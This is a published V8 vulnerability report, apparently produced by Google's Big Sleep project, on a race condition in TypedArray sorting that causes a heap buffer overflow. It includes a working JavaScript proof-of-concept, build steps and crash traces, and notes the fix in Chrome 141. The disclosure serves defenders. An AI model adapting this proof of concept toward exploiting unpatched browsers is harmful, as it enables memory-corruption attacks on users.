# 439521654

Issue URL: https://issuetracker.google.com/issues/439521654
VRP-Reward: INT
Date: Aug 18, 2025 08:19PM


_Publishing the original report in line with the disclosure policy._

* * *

We are tracking this issue with the public ID BIGSLEEP-439521654. Please use this identifier for reference in any future communication.

# Vulnerability Details

There is a bug due to a race condition in the implementation of sorting for TypedArrays, specifically in Runtime_TypedArraySortFast [1]. For the case of shared ArrayBuffers, the logic of this function is roughly:

  * Fetch the `byte_length` of the typed array (line 123)
  * Allocate a temporary buffer of that size (lines 137-146)
  * Copy the contents of the typed array into the temporary buffer (line 147)
  * Fetch the `length` (in number of elements) of the typed array (line 154)
  * Call std::sort on the temporary buffer with the element length (lines 157-188)
  * Copy the data back into the typed array (lines 190-196)

The problem here is that the typed array could’ve been resized on another thread between step (1) and (4), leading to memory corruption during sorting. The testcase below demonstrates this by spawning a worker thread which resizes the typed array while the main thread sorts it, leading to a buffer overflow.

Note that this bug is mitigated on all platforms where the V8 sandbox is enabled due to a SBXCHECK that ensures the length hasn’t changed [2]. However, on non-sandbox builds (in particular, 32-bit versions of Chrome), the SBXCHECK is a DCHECK [3] and therefore these configurations are vulnerable.

[1] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/runtime/runtime-typedarray.cc;l=106;drc=510cfe5439f5ea300d6883608bde3c8b3e8f618e](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/runtime/runtime-typedarray.cc;l=106;drc=510cfe5439f5ea300d6883608bde3c8b3e8f618e>)

[2] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/runtime/runtime-typedarray.cc;l=162;drc=510cfe5439f5ea300d6883608bde3c8b3e8f618e](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/runtime/runtime-typedarray.cc;l=162;drc=510cfe5439f5ea300d6883608bde3c8b3e8f618e>)

[3] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/sandbox/check.h;l=65;drc=510cfe5439f5ea300d6883608bde3c8b3e8f618e](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/sandbox/check.h;l=65;drc=510cfe5439f5ea300d6883608bde3c8b3e8f618e>)

# Affected Version(s)

The issue has been successfully reproduced:

  * at HEAD (commit bcdacbf04300b83755ae4a3770c442412d23cbe8)
  * in stable release 13.9.205.16 (b07b4e9376489c7f7c0ff2af5eceb4261b3bb784)

# Reproduction

### Test Case

```
function main() {
    // Large sizes to increase memcpy time and OOB impact.
    const initialSize = 512 * 1024;
    const maxSize = 2 * initialSize;
    const newSize = maxSize;
    const syncSAB = new SharedArrayBuffer(4);
    const sync = new Int32Array(syncSAB);
    // States: 0=init, 1=worker ready, 2=main ready (grow now)
    const workerScript = `
        onmessage = function(e) {
            const gsab = e.data.gsab;
            const newSize = e.data.newSize;
            const sync = new Int32Array(e.data.sync);
            Atomics.store(sync, 0, 1);
            Atomics.notify(sync, 0);
            Atomics.wait(sync, 0, 1);
            gsab.grow(newSize);
            postMessage("done");
        };
    `;
    for (let i = 0; i < 100; i++) {
        // Reset synchronization state.
        Atomics.store(sync, 0, 0);
        let gsab_i = new SharedArrayBuffer(initialSize, { maxByteLength: maxSize });
        const ta_i = new Int8Array(gsab_i);
        const worker = new Worker(workerScript, { type: 'string' });
        worker.postMessage({ gsab: gsab_i, newSize: newSize, sync: syncSAB });
        // Wait for worker to become ready.
        while (Atomics.load(sync, 0) !== 1) {}
        // Signal worker to resize buffer.
        Atomics.store(sync, 0, 2);
        Atomics.notify(sync, 0);
        ta_i.sort();
        worker.getMessage();
        worker.terminate();
    }
}
main();
```

### Build Instructions

Follow the instructions at [https://v8.dev/docs/build](<https://v8.dev/docs/build>). The crash was verified on a release and optdebug build:

```
gm.py x64.optdebug
gm.py ia32.release
```

### Command

```
d8 crash.js
```

### Crash Backtrace

On x64:

```
#
# Fatal error in ../../src/runtime/runtime-typedarray.cc, line 197
# Check failed: length * sizeof(int8_t) == byte_length.
#
#
#
#FailureMessage Object: 0x7ffdaabaeba0
==== C stack trace ===============================
    v8/v8/out/x64.optdebug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x13) [0x7f65c440f943]
    v8/v8/out/x64.optdebug/libv8_libplatform.so(+0x1bb1d) [0x7f65c43b6b1d]
    v8/v8/out/x64.optdebug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x194) [0x7f65c43f1244]
    v8/v8/out/x64.optdebug/libv8.so(v8::internal::Runtime_TypedArraySortFast(int, unsigned long*, v8::internal::Isolate*)+0x121b) [0x7f65c1e0500b]
    v8/v8/out/x64.optdebug/libv8.so(+0x24abf7d) [0x7f65c04abf7d]
```

On ia32:

```
=================================================================
==476648==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xf597f7ff at pc 0x5e8dabdd bp 0xffc821a8 sp 0xffc821a0
READ of size 1 at 0xf597f7ff thread T0
    #0 0x5e8dabdc in operator()<signed char &, signed char &> third_party/libc++/src/include/__functional/ranges_operations.h:56:37
    #1 0x5e8dabdc in __cond_swap<std::__Cr::ranges::less, signed char *> third_party/libc++/src/include/__algorithm/sort.h:71:22
    #2 0x5e8dabdc in __sort3<std::__Cr::_ClassicAlgPolicy, std::__Cr::ranges::less, signed char *, 0> third_party/libc++/src/include/__algorithm/sort.h:102:21
    #3 0x5e8dabdc in void std::__Cr::__introsort<std::__Cr::_ClassicAlgPolicy, std::__Cr::ranges::less, signed char*, true>(signed char*, signed char*, std::__Cr::ranges::less, std::__Cr::iterator_traits<signed char*>::difference_type, bool) third_party/libc++/src/include/__algorithm/sort.h
    #4 0x5e8d940b in void std::__Cr::__sort<std::__Cr::__less<signed char, signed char>&, signed char*>(signed char*, signed char*, std::__Cr::__less<signed char, signed char>&) third_party/libc++/src/src/algorithm.cpp:21:3
    #5 0x5a059996 in __sort_dispatch<std::__Cr::_ClassicAlgPolicy, signed char, 0> third_party/libc++/src/include/__algorithm/sort.h:900:3
    #6 0x5a059996 in __sort_impl<std::__Cr::_ClassicAlgPolicy, signed char *, std::__Cr::__less<void, void> > third_party/libc++/src/include/__algorithm/sort.h:934:5
    #7 0x5a059996 in sort<signed char *, std::__Cr::__less<void, void> > third_party/libc++/src/include/__algorithm/sort.h:942:3
    #8 0x5a059996 in sort<signed char *> third_party/libc++/src/include/__algorithm/sort.h:948:3
    #9 0x5a059996 in __RT_impl_Runtime_TypedArraySortFast src/runtime/runtime-typedarray.cc:195:5
    #10 0x5a059996 in v8::internal::Runtime_TypedArraySortFast(int, unsigned int*, v8::internal::Isolate*) src/runtime/runtime-typedarray.cc:115:1
    #11 0x5e1c39cc in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit setup-isolate-deserialize.cc
    #12 0x5e2643c3 in Builtins_TypedArrayPrototypeSort setup-isolate-deserialize.cc
    #13 0x5e140789 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #14 0x5e140789 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #15 0x5e13e198 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #16 0x5e13dfc0 in Builtins_JSEntry setup-isolate-deserialize.cc
    #17 0x589081b6 in Call src/execution/simulator.h:212:12
    #18 0x589081b6 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #19 0x5890b75d in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #20 0x5830c455 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:1968:7
    #21 0x5830bd96 in v8::Script::Run(v8::Local<v8::Context>) src/api/api.cc:1932:10
    #22 0x5822dbd5 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1033:44
    #23 0x58277657 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5322:10
    #24 0x58286382 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6274:37
    #25 0x58285b41 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6182:18
    #26 0x58289b32 in v8::Shell::Main(int, char**) src/d8/d8.cc:7049:18
    #27 0x5828b54e in main src/d8/d8.cc:7141:43
    #28 0xf7bdfcc2  (/lib/i386-linux-gnu/libc.so.6+0x24cc2) (BuildId: bc8cfd04005f8ec0ea625017471f87f74d292663)
Address 0xf597f7ff is a wild pointer inside of access range of size 0x00000001.
SUMMARY: AddressSanitizer: heap-buffer-overflow third_party/libc++/src/include/__functional/ranges_operations.h:56:37 in operator()<signed char &, signed char &>
Shadow bytes around the buggy address:
  0xf597f500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xf597f580: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xf597f600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xf597f680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xf597f700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0xf597f780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa[fa]
  0xf597f800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xf597f880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xf597f900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xf597f980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xf597fa00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==476648==ABORTING
```

# Reporter Credit

Google Big Sleep

# Disclosure Policy

This bug is subject to a 90-day disclosure deadline. If a fix for this issue is made available to users before the end of the 90-day deadline, this bug report will become public 30 days after the fix was made available. Otherwise, this bug report will become public at the deadline. The scheduled deadline is 2025-11-16. For more information, visit [https://goo.gle/bigsleep](<https://goo.gle/bigsleep>)


---

**#2 — sa...@google.com — Oct 23, 2025 08:32PM**

A hardening change rendered this issue unexploitable and was shipped to users in Chrome 141.0.7390.37 ([https://chromereleases.googleblog.com/2025/09/early-stable-update-for-desktop.html](<https://chromereleases.googleblog.com/2025/09/early-stable-update-for-desktop.html>)), we therefore consider this bug fixed in that release.
